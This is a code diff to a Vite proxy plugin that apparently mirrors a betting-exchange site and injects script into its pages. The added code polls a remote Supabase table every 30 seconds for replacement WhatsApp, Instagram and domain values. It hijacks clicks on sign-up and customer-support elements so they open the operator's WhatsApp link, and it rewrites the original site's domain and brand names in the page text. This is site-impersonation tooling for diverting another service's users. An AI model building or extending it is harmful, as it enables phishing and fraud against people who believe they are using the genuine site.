@@ -102,9 +102,33 @@ function skyExchProxyPlugin(): Plugin {
               </style>
               <script>
                 (function() {
-                  const WA_LINK = ${JSON.stringify(WHATSAPP_URL)};
-                  const IG_LINK = ${JSON.stringify(INSTAGRAM_URL)};
-                  const IG_NAME = ${JSON.stringify(INSTAGRAM_NAME)};
+                  let WA_LINK = ${JSON.stringify(WHATSAPP_URL)};
+                  let IG_LINK = ${JSON.stringify(INSTAGRAM_URL)};
+                  let IG_NAME = ${JSON.stringify(INSTAGRAM_NAME)};
+                  let FOOTER_DOMAIN = 'www.skyexchangepro.com';
+
+                  // Realtime Sync with Supabase Database
+                  function syncSupabaseSettings() {
+                    fetch('https://ompmgysuoisdyiateovg.supabase.co/rest/v1/site_settings?id=eq.config&select=*', {
+                      headers: {
+                        'apikey': 'sb_publishable_XQ2t2Fs2CjNjS3f9JrXLpA_IZE6O2W6',
+                        'Authorization': 'Bearer sb_publishable_XQ2t2Fs2CjNjS3f9JrXLpA_IZE6O2W6'
+                      }
+                    })
+                    .then(function(res) { return res.json(); })
+                    .then(function(data) {
+                      if (data && data[0]) {
+                        const conf = data[0];
+                        if (conf.whatsapp_url) WA_LINK = conf.whatsapp_url;
+                        if (conf.instagram_url) IG_LINK = conf.instagram_url;
+                        if (conf.instagram_name) IG_NAME = conf.instagram_name;
+                        if (conf.footer_domain) FOOTER_DOMAIN = conf.footer_domain;
+                      }
+                    })
+                    .catch(function(err) { console.warn('Supabase sync warning:', err); });
+                  }
+                  syncSupabaseSettings();
+                  setInterval(syncSupabaseSettings, 30000); // Re-sync every 30 seconds
 
                   // 1. Fix Captcha Image src to use origin instead of invalid saapipl subdomain
                   function fixCaptchaImages() {
@@ -117,7 +141,7 @@ function skyExchProxyPlugin(): Plugin {
                     });
                   }
 
-                  // 2. Click Interceptor for Sign Up, Instagram and Captcha refresh
+                  // 2. Click Interceptor for Sign Up, WhatsApp, Customer Support, and Instagram
                   document.addEventListener('click', function(e) {
                     const el = e.target.closest('button, a, div, span, li, img');
                     if (!el) return;
@@ -132,6 +156,25 @@ function skyExchProxyPlugin(): Plugin {
 
                     // Sign up
                     if (text === 'sign up' || text === 'signup' || text === 'register' || text.includes('get online id')) {
+                      e.preventDefault();
+                      e.stopPropagation();
+                      window.open(WA_LINK, '_blank', 'noopener,noreferrer');
+                      return false;
+                    }
+
+                    // WhatsApp & Customer Support Links
+                    if (
+                      text.includes('whatsapp') ||
+                      text.includes('customer support') ||
+                      text.includes('support1') ||
+                      text.includes('support2') ||
+                      text.includes('support 1') ||
+                      text.includes('support 2') ||
+                      el.classList.contains('icon-support-whatsapp') ||
+                      el.querySelector('.icon-support-whatsapp') ||
+                      el.classList.contains('icon-support-customer') ||
+                      el.querySelector('.icon-support-customer')
+                    ) {
                       e.preventDefault();
                       e.stopPropagation();
                       window.open(WA_LINK, '_blank', 'noopener,noreferrer');
@@ -156,7 +199,7 @@ function skyExchProxyPlugin(): Plugin {
                           node.textContent = node.textContent.replace(/skyexchindia/g, IG_NAME);
                         }
                         if (node.textContent.includes('skyexch.vip')) {
-                          node.textContent = node.textContent.replace(/skyexch\.vip/g, 'skyexchangepro.com');
+                          node.textContent = node.textContent.replace(/skyexch\.vip/g, FOOTER_DOMAIN);
                         }
                       }
                     });
